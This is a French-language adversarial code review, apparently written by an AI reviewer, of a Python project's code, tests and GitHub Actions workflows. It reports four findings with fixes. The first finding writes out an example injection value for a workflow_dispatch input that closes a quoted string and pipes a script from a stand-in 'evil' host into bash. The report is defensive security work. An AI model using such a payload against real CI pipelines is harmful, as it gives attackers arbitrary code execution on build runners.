# Deep Dive Adversarial — LAIVEL UP

**Date** : 2026-08-24
**Méthode** : persona *Adversarial Reviewer* (skill `ce-code-review` du plugin compound-engineering) appliquée manuellement au code actuel — pas un diff Git, pas le pipeline multi-agents (nécessite Claude Code/OpenCode, indisponible dans ce chat). Lecture directe : `schema.py`, `team.py`, `cli.py`, `pyproject.toml`, `test_install_clean.py`, `test_cli_extended.py`, `.github/workflows/{ci,aidd-eval}.yml`, `.gitignore`, comparaison avec les audits du 23/08 et 24/08.
**Angle** : pas "est-ce que ça marche", mais "dans quel scénario précis est-ce que ça casse".

## 0. Ce qui est déjà corrigé (23/08 → aujourd'hui)

Les 3 bugs critiques de l'audit du 23/08 sont **résolus** dans le code actuel :
- `schema.py` : le schéma est bien sous `src/laivelup/schemas/`, et `pyproject.toml` déclare `[tool.setuptools.package-data] laivelup = ["schemas/*.json"]` → empaqueté correctement dans le wheel.
- `team.py` a maintenant `load_team()`/`save_team()`, et `cli.py` les appelle dans `team evaluate`, `team export`, `team opt-out`, `team remove` → persistance réelle.
- `test_install_clean.py::test_cli_evaluate_real` existe maintenant (vraie évaluation post-install, pas juste `--help`).
- Les correctifs sécurité S1/S2/S3/S5/S6 du 24/08 (échappement HTML du nom d'équipe, regex `_validate_team_name`, trim historique, limite 50 membres) sont bien dans le code.

Bonne nouvelle donc. Voici ce que la lentille adversariale trouve **en plus**, sur le code tel qu'il est maintenant.

## 1. Findings

| # | Sev | Catégorie | Location | Scénario constructible | Confiance |
|---|-----|-----------|----------|------------------------|-----------|
| 1 | 🔴 P1 | security (CI) | `.github/workflows/aidd-eval.yml:52-58` | **Injection de commande shell via `workflow_dispatch.inputs.user`** | 100 |
| 2 | 🟡 P1 | correctness/testing | `tests/test_install_clean.py:53` | **Le test censé garantir le fix P0 du 23/08 plante lui-même** | 100 |
| 3 | 🟡 P2 | composition | `tests/test_cli_extended.py::TestTeamCommands` | **État réel partagé entre tests via `.laivelup/teams/`** | 75 |
| 4 | 🟢 P3 | correctness (mineur) | `.github/workflows/aidd-eval.yml:79` | Sur-échappement des `$` dans le corps du commentaire PR | 50 |

---

### #1 — Injection shell via `workflow_dispatch.inputs.user` — `aidd-eval.yml`

**Scénario** : `aidd-eval.yml` accepte un déclenchement manuel avec un input libre `user` (`type: string`, sans contrainte de format). Deux endroits interpolent cette valeur **directement dans un bloc `run:` shell**, avant même que bash ne s'exécute — c'est GitHub Actions qui substitue le texte de `${{ }}` dans le script *avant* de le lancer, pas bash qui le traite comme une variable :

```yaml
# Étape "Detect author"
echo "user=${{ inputs.user }}" >> $GITHUB_OUTPUT
```
```yaml
# Étape "Generate profile"
python scripts/generate_profile.py --user "${{ steps.author.outputs.user }}" ...
```

Si quelqu'un déclenche le workflow avec `user` = `x"; curl http://evil/x.sh | bash #`, GitHub Actions colle ce texte tel quel dans le script bash *avant* exécution — les guillemets `"` cassent la chaîne prévue et le reste s'exécute comme commande shell arbitraire sur le runner. C'est le pattern d'injection GitHub Actions documenté (GHSL) : `${{ }}` dans un `run:` n'est jamais sûr pour de l'input non fiable, contrairement à une vraie variable d'environnement shell.

**Pourquoi ce n'est pas juste théorique** : le déclenchement manuel (`workflow_dispatch`) nécessite un accès en écriture au repo — donc l'attaquant n'est pas "n'importe qui sur Internet", mais un collaborateur (ou un compte compromis avec accès écriture). Le workflow tourne avec `pull-requests: write` : de quoi poster des commentaires malveillants sur toutes les PR, exfiltrer ce que le runner peut atteindre, ou pivoter si d'autres secrets sont ajoutés plus tard. Le fix est trivial et change juste le pattern.

**Correctif recommandé** :
```yaml
- name: Detect author
  id: author
  env:
    RAW_USER: ${{ inputs.user }}
    ACTOR: ${{ github.actor }}
  run: |
    if [ "${{ github.event_name }}" = "workflow_dispatch" ]; then
      echo "user=$RAW_USER" >> $GITHUB_OUTPUT
    else
      echo "user=$ACTOR" >> $GITHUB_OUTPUT
    fi

- name: Generate profile
  env:
    AUTHOR_USER: ${{ steps.author.outputs.user }}
  run: |
    python scripts/generate_profile.py --user "$AUTHOR_USER" --out profile.json --verbose
```
Passer par `env:` fait porter la substitution à bash (qui traite `$RAW_USER` comme une vraie variable, guillemets compris), au lieu que GitHub Actions colle du texte brut dans le script. Même chose pour l'étape "Evaluate AIDD" qui réutilise `steps.author.outputs.user`.

`github.actor` seul (le cas PR normal) est safe — GitHub contraint les usernames à l'alphanumérique + tirets. Le risque est spécifiquement `inputs.user`.

---

### #2 — Le test censé garantir le fix critique du 23/08 plante lui-même

**`tests/test_install_clean.py:53`** :
```python
result = subprocess.run(['laivelup', 'evaluate', ...], capture_output=True, text=True, timeout=60)
assert result.returncode == 0, f'laivelup evaluate failed: {result.stderr}'
assert 'Niveau' in result.output or 'Refus' in result.output or 'refus' in result.output
```

`subprocess.run()` renvoie un `CompletedProcess`, qui n'a **pas** d'attribut `.output` (seul `CalledProcessError` en a un). `result.output` lève `AttributeError` — systématiquement, dès que la première assertion passe (c'est-à-dire dès que `laivelup evaluate` fonctionne vraiment).

**L'ironie** : ce test a été ajouté spécifiquement pour détecter le bug P0 du 23/08 (« evaluate plante après une install non-éditable »). Aujourd'hui :
- Si `evaluate` est cassé → `returncode != 0` → l'assertion 1 échoue proprement, message clair.
- Si `evaluate` **fonctionne** (le cas nominal, celui que ce test doit prouver) → on atteint la ligne 2 → crash `AttributeError`, aucun rapport sur le vrai contenu.

Ce test ne peut donc **jamais passer au vert**, même quand tout va bien — ce qui est le pire résultat possible pour un test : il ne fournit plus le signal "le fix P0 tient", et un⋅e futur⋅e relecteur⋅se de CI qui voit ce test rouge en permanence apprend à l'ignorer — ce qui neutralise sa fonction de garde-fou pour une vraie régression.

**Où ça tourne** : `ci.yml` job `test` lance `pytest -q --tb=short` sans filtre de marker (`slow`/`install` compris) sur 3 OS × 3 Python = 9 combinaisons. Le crash sort donc à chaque run.

**Correctif** :
```python
assert 'Niveau' in result.stdout or 'Refus' in result.stdout or 'refus' in result.stdout
```

---

### #3 — État réel partagé entre tests via `.laivelup/teams/`

**Preuve empirique** — ces fichiers existent déjà sur disque, à la racine du projet :
```
.laivelup/teams/Alpha.json
.laivelup/teams/ExportCSV.json
.laivelup/teams/ExportJSON.json
.laivelup/teams/Persist.json
```
Ce sont exactement les noms d'équipe créés par `TestTeamCommands` dans `test_cli_extended.py` (`Alpha`, `ExportCSV`, `ExportJSON`, `Persist`). C'est la preuve directe que la suite de tests écrit dans le **répertoire réel du projet** (`.laivelup/` est CWD-relatif dans `team.py::_DEFAULT_TEAM_DIR`), pas dans un `tmp_path` isolé.

**Scénario cassant** : `test_team_create` crée l'équipe `Alpha` et la sauvegarde. `test_team_export_md`, `test_team_export_format_inconnu` et `test_team_evaluate` réutilisent `Alpha` **sans la recréer** — ils dépendent de l'état laissé par `test_team_create` plus tôt dans la même session pytest.
- Isoler un test (`pytest -k test_team_export_md`) → échoue, "Équipe 'Alpha' introuvable ou vide" (rien ne l'a créée).
- Ou pire : ça "passe" en silence sur un `Alpha.json` **d'un run précédent**, sans exercer le code actuel — un faux positif classique.
- Actuellement stable seulement parce que pytest garde l'ordre de déclaration et qu'aucun plugin de parallélisation (`pytest-xdist`) ou de randomisation (`pytest-randomly`) n'est dans les dev deps — mais c'est fragile, pas garanti, et ça pollue le répertoire de travail à chaque run local (`.laivelup/` est bien dans `.gitignore`, donc pas commité — mais reste un résidu réel sur le disque de dev/CI).

**Correctif** (pattern standard pytest) : fixture qui redirige `_DEFAULT_TEAM_DIR` vers `tmp_path`, ou passer explicitement `path=tmp_path / "team.json"` à `load_team`/`save_team` dans chaque test — actuellement ces fonctions n'ont pas de moyen simple d'être appelées avec un `path` custom depuis les commandes CLI (`team_evaluate` fait `load_team(team_name)` sans option `--team-dir`). Piste la plus rapide sans toucher au CLI : un `conftest.py` avec une fixture `autouse` qui `monkeypatch.chdir(tmp_path)` avant chaque test de `TestTeamCommands`.

---

### #4 — Sur-échappement des `$` (mineur, cosmétique)

Dans `aidd-eval.yml`, l'échappement `rawVerdict.replace(/\$/g, '\\$')` échappe **tout** `$`, pas seulement `${`. Si `verdict.md` contient un `$` légitime (ex. un exemple de coût, une variable shell citée dans une explication), il apparaîtra comme `\$` dans le commentaire PR rendu — un défaut d'affichage, pas une faille. L'ordre des trois `.replace()` (backslash → backtick → dollar) est en revanche correct (évite le double-échappement). Pas d'action urgente ; à corriger seulement si ça se voit en pratique (`replace(/\$\{/g, '\\${')` au lieu de tous les `$`).

## 2. Ce que je n'ai pas vérifié (résidu, pas un finding)

- Est-ce que `verdict.md` peut contenir du texte contrôlé par un tiers (message de commit, nom de branche) qui remonterait jusqu'au commentaire PR ? Nécessiterait de lire `scripts/generate_profile.py` et `scripts/ci_evaluate.py` en détail — je ne l'ai pas fait, effort/temps. Si le temps le permet avant la deadline, vaut le coup de vérifier vite fait que rien de "libre" (commit message, nom de branche) n'entre dans `verdict.md` sans passer par le même échappement.
- Cascade réelle entre `test_pip_install` (réinstalle le package en mode non-éditable *au milieu* de la session pytest du job `test`, alors que ce job avait déjà fait `pip install -e ".[dev]"`) et les tests qui s'exécutent après dans la même session. Probablement inoffensif (les imports Python déjà chargés ne changent pas), mais je ne l'ai pas tracé jusqu'au bout — signalé pour mémoire, pas un finding confirmé.

## 3. Priorisation (aujourd'hui, jour de deadline)

1. **#1 (injection shell CI)** — 10 min, `env:` au lieu de `${{ }}` inline. Le plus important, le moins cher.
2. **#2 (`result.output`)** — 1 ligne, `result.output` → `result.stdout`. Redonne un vrai signal vert/rouge à un test qui protège un bug P0 déjà vécu.
3. **#3 (isolation `.laivelup/`)** — peut attendre après la deadline si le temps manque ; le risque ne se matérialise pas dans la config CI actuelle (pas de parallélisation), c'est de la dette, pas un incendie.
4. **#4** — cosmétique, à laisser tel quel sauf si ça se voit dans un vrai commentaire PR.
